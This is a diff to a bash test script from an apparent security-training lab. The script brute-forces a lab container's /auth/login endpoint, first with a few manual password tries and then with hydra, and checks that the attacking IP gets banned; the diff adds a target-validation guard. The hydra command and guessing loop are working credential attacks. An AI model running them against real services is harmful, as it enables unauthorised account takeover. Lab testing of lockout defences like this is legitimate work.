@@ -4,6 +4,24 @@
 
 set -e
 
+# Resolve the repository copy when run from source and the read-only mounted
+# copy when run in the attack container. No external command runs before the
+# target profile is validated.
+ATTACK_SCRIPT_PATH="${BASH_SOURCE[0]}"
+ATTACK_SCRIPT_DIR="${ATTACK_SCRIPT_PATH%/*}"
+if [[ "$ATTACK_SCRIPT_DIR" == "$ATTACK_SCRIPT_PATH" ]]; then
+    ATTACK_SCRIPT_DIR=.
+fi
+if [[ -r "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh" ]]; then
+    source "$ATTACK_SCRIPT_DIR/../../scripts/lib/target_guard.sh"
+elif [[ "$ATTACK_SCRIPT_DIR" == "/scripts" && -r "/secure-learn-target-guard.sh" ]]; then
+    source "/secure-learn-target-guard.sh"
+else
+    echo "ERROR: Secure Learn target guard is unavailable." >&2
+    exit 64
+fi
+secure_learn_validate_target
+
 # Configuration
 TARGET="${TARGET:-app}"
 TARGET_IP="${TARGET_IP:-172.23.0.20}"
@@ -27,7 +45,7 @@ mkdir -p "$OUTPUT_DIR"
 
 # Check if target is reachable
 echo "Checking target connectivity..."
-if ! curl -s --connect-timeout 5 "http://$TARGET:$TARGET_PORT/" > /dev/null 2>&1; then
+if ! curl -s --connect-timeout 5 -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/" > /dev/null 2>&1; then
     echo "ERROR: Target is not reachable at http://$TARGET:$TARGET_PORT"
     exit 1
 fi
@@ -44,7 +62,8 @@ echo "============================================"
 # Demonstrate a few manual attempts first
 for password in "password" "admin" "123456" "wrong"; do
     echo "Trying: $USERNAME / $password"
-    response=$(curl -s -X POST "http://$TARGET:$TARGET_PORT/auth/login" \
+    response=$(curl -s -X POST "http://$TARGET_IP:$TARGET_PORT/auth/login" \
+        -H "Host: $TARGET" \
         -H "Content-Type: application/json" \
         -d "{\"username\":\"$USERNAME\",\"password\":\"$password\"}" \
         -w "\nHTTP_CODE:%{http_code}")
@@ -71,7 +90,7 @@ hydra -l "$USERNAME" \
     -s "$TARGET_PORT" \
     -f \
     -V \
-    "$TARGET" \
+    "$TARGET_IP" \
     http-post-form "/auth/login:username=^USER^&password=^PASS^:Invalid" \
     > "$OUTPUT_FILE" 2>&1 || hydra_status=$?
 
@@ -94,7 +113,7 @@ sleep 2
 
 # Check if we're banned
 echo "Checking if attack IP is banned..."
-banned_check=$(curl -s --connect-timeout 5 "http://$TARGET:$TARGET_PORT/auth/login" 2>&1 || echo "CONNECTION_REFUSED")
+banned_check=$(curl -s --connect-timeout 5 -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/auth/login" 2>&1 || echo "CONNECTION_REFUSED")
 
 if echo "$banned_check" | grep -q "CONNECTION_REFUSED\|timeout\|Connection refused"; then
     echo "  [PASS] Connection refused after repeated attempts"
